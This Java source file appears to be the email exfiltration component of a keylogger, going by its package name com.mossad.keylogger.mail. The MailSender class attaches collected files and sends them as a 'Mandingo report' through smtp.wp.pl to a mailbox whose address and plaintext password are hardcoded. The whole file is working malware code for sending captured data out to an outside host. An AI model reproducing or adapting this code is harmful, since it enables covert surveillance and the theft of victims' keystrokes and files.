package com.mossad.keylogger.mail;

import org.apache.commons.mail.EmailAttachment;
import org.apache.commons.mail.EmailException;
import org.apache.commons.mail.MultiPartEmail;

import java.time.LocalDateTime;
import java.util.List;

public final class MailSender {

    private EmailAttachment attachment;
    private MultiPartEmail email;
    private final String MAIL_HOST_NAME = "smtp.wp.pl";
    private final String FROM = "kisonar@wp.pl";
    private final String PASSWORD = "sonar";

    public MailSender() {

    }

    public void prepareEmailWithAtatchment(List<String> files) throws EmailException {
        email = prepareEmail();
        files.forEach(file -> {
            attachment = prepareEmailAttachment(file);
            try {
                email.attach(attachment);
            } catch (EmailException e) {
                e.printStackTrace();
            }
        });

    }

    public void send() throws EmailException {
        email.send();
    }

    private MultiPartEmail prepareEmail() throws EmailException {
        email = new MultiPartEmail();
        email.setHostName(MAIL_HOST_NAME);
        email.addTo(FROM);
        email.setFrom(FROM);
        email.setSubject("Mandingo report");
        email.setMsg("Mandingo report: " + LocalDateTime.now().toString());
        email.setSmtpPort(465);
        email.setSSLOnConnect(true);
        email.setSSLCheckServerIdentity(true);
        email.setBounceAddress(FROM);
        email.setAuthentication(FROM, PASSWORD);
        return email;
    }

    private EmailAttachment prepareEmailAttachment(String filePath) {
        attachment = new EmailAttachment();
        attachment.setPath(filePath);
        attachment.setDisposition(EmailAttachment.ATTACHMENT);
        return attachment;
    }


}
